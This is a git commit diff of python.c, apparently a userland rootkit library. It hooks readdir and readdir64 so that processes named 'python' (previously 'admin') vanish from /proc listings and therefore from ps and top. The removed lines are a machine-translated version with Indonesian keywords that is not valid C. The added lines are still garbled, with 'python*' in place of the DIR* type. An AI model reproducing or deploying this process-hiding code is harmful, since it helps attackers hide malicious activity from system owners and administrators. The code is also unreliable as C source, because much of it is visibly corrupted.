da46d3bfb2011f4db41c3f99399a22dc4637ffcb
fhuko1357 <95587230+fhuko1357@users.noreply.github.com>
2024-06-22 21:27:19 +0700

    Update python.c

--- python.c
+++ python.c
@@ -1,98 +1,98 @@
-#tentukan _GNU_SOURCE
+#define _GNU_SOURCE
 
-#termasuk <stdio.h>
-#termasuk <dlfcn.h>
-#termasuk <dirent.h>
-#termasuk <string.h>
-#termasuk <unistd.h>
-
-/*
- * Setiap proses dengan nama ini akan dikecualikan
- */
-static const char* process_to_filter = "admin";
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
 
 /*
- * Dapatkan nama direktori yang diberi pegangan DIR*
+ * Every process with this name will be excluded
  */
-static int get_dir_name(python* dirp, char* buf, ukuran_t ukuran)
+static const char* process_to_filter = "python";
+
+/*
+ * Get a directory name given a DIR* handle
+ */
+static int get_dir_name(python* dirp, char* buf, size_t size)
 {
     int fd = dirfd(dirp);
-    jika(fd == -1) {
-        kembali 0;
+    if(fd == -1) {
+        return 0;
     }
 
-    karakter tmp[64];
+    char tmp[64];
     snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
-    ssize_t ret = readlink(tmp, buf, ukuran);
-    jika(kembali == -1) {
-        kembali 0;
+    ssize_t ret = readlink(tmp, buf, size);
+    if(ret == -1) {
+        return 0;
     }
 
-    buf[mundur] = 0;
-    kembali 1;
+    buf[ret] = 0;
+    return 1;
 }
 
 /*
- * Dapatkan nama proses berdasarkan pidnya
+ * Get a process name given its pid
  */
-int statis get_process_name(char* pid, char* buf)
+static int get_process_name(char* pid, char* buf)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
-        kembali 0;
+        return 0;
     }
 
-    karakter tmp[256];
+    char tmp[256];
     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
  
     FILE* f = fopen(tmp, "r");
-    jika(f == BATAL) {
-        kembali 0;
+    if(f == NULL) {
+        return 0;
     }
 
     if(fgets(tmp, sizeof(tmp), f) == NULL) {
-        tutup(f);
-        kembali 0;
+        fclose(f);
+        return 0;
     }
 
-    tutup(f);
+    fclose(f);
 
-    int tidak digunakan;
-    sscanf(tmp, "%d (%[^)]s", &tidak digunakan, buf);
-    kembali 1;
+    int unused;
+    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    return 1;
 }
 
-#define DECLARE_READDIR(dirent, readdir) \
-struct statis dirent* (*asli_##readdir)(python*) = NULL; \
+#define DECLARE_READDIR(dirent, readdir)                                \
+static struct dirent* (*original_##readdir)(python*) = NULL;               \
                                                                         \
-struct dirent* readdir(DIR *dirp) \
-{\
-    jika(asli_##readdir == NULL) { \
-        asli_##readdir = dlsym(RTLD_NEXT, #readdir); \
-        jika(asli_##readdir == NULL) \
-        {\
-            fprintf(stderr, "Kesalahan pada dlsym: %s\n", dlerror()); \
-        } \
-    } \
+struct dirent* readdir(DIR *dirp)                                       \
+{                                                                       \
+    if(original_##readdir == NULL) {                                    \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        if(original_##readdir == NULL)                                  \
+        {                                                               \
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
+        }                                                               \
+    }                                                                   \
                                                                         \
-    struct dirent* dir; \
+    struct dirent* dir;                                                 \
                                                                         \
-    sementara(1) \
-    {\
-        dir = asli_##readdir(dirp); \
-        jika(dir) { \
-            char dir_name[256]; \
-            karakter nama_proses[256]; \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
-                strcmp(dir_name, "/proc") == 0 && \
-                get_process_name(dir->d_name, proses_name) && \
-                strcmp(nama_proses, proses_ke_filter) == 0) { \
-                melanjutkan; \
-            } \
-        } \
-        merusak; \
-    } \
-    kembalikan direktori; \
+    while(1)                                                            \
+    {                                                                   \
+        dir = original_##readdir(dirp);                                 \
+        if(dir) {                                                       \
+            char dir_name[256];                                         \
+            char process_name[256];                                     \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+                strcmp(dir_name, "/proc") == 0 &&                       \
+                get_process_name(dir->d_name, process_name) &&          \
+                strcmp(process_name, process_to_filter) == 0) {         \
+                continue;                                               \
+            }                                                           \
+        }                                                               \
+        break;                                                          \
+    }                                                                   \
+    return dir;                                                         \
 }
 
 DECLARE_READDIR(dirent64, readdir64);
-DECLARE_READDIR(langsung, readdir);
+DECLARE_READDIR(dirent, readdir);
